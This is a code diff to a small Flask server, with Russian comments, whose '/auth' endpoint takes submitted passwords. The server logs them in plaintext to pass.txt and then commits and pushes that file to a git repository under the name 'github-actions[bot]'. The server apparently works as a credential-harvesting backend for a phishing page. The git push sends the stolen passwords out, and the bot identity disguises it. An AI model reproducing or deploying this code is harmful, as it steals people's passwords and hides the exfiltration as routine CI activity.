@@ -1,8 +1,10 @@
-from flask import Flask, request, jsonify, send_file, make_response
+from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 import logging
 import sys
 import os
+import subprocess
+import datetime
 
 # Отключаем лишние логи
 logging.getLogger('werkzeug').setLevel(logging.ERROR)
@@ -16,33 +18,43 @@ os.makedirs(OUT_DIR, exist_ok=True)
 # Путь к лог-файлу
 PASSWORD_LOG_PATH = os.path.join(OUT_DIR, "pass.txt")
 
-# Настраиваем логгер для паролей
-password_logger = logging.getLogger("password_logger")
-password_logger.setLevel(logging.INFO)
-file_handler = logging.FileHandler(PASSWORD_LOG_PATH, mode="a", encoding="utf-8")
-file_handler.setFormatter(logging.Formatter("%(asctime)s - %(message)s"))
-password_logger.addHandler(file_handler)
-
+# Flask-приложение
 app = Flask(__name__)
 CORS(app)
+
+def write_password_to_file(password):
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    log_line = f"{timestamp} - 🔐 Пароль: {password}\n"
+    try:
+        with open(PASSWORD_LOG_PATH, "a", encoding="utf-8") as f:
+            f.write(log_line)
+            f.flush()
+        print("✅ Пароль записан:", password)
+        sys.stdout.flush()
+        return True
+    except Exception as e:
+        print(f"❌ Ошибка при записи пароля: {e}")
+        sys.stdout.flush()
+        return False
+
+def git_commit_and_push():
+    try:
+        subprocess.run(["git", "config", "user.name", "github-actions[bot]"], check=True)
+        subprocess.run(["git", "config", "user.email", "github-actions[bot]@users.noreply.github.com"], check=True)
+        subprocess.run(["git", "add", PASSWORD_LOG_PATH], check=True)
+        subprocess.run(["git", "commit", "-m", "🔐 Добавлен новый пароль"], check=True)
+        subprocess.run(["git", "push"], check=True)
+        print("🚀 Git push завершён.")
+    except subprocess.CalledProcessError as e:
+        print(f"⚠️ Git ошибка: {e}")
+        sys.stdout.flush()
 
 @app.route('/auth', methods=['POST'])
 def auth():
     data = request.form
     password = data.get('password')
-
-    log_line = f"🔐 Пароль: {password}\n"
-
-    try:
-        with open(PASSWORD_LOG_PATH, "a", encoding="utf-8") as f:
-            f.write(log_line)
-            f.flush()  # <- очень важно в CI/CD
-        print("✅ Пароль записан:", password)
-        sys.stdout.flush()
-    except Exception as e:
-        print(f"❌ Ошибка при записи пароля: {e}")
-        sys.stdout.flush()
-
+    if write_password_to_file(password):
+        git_commit_and_push()
     return jsonify({"status": "ok"})
 
 @app.route("/")
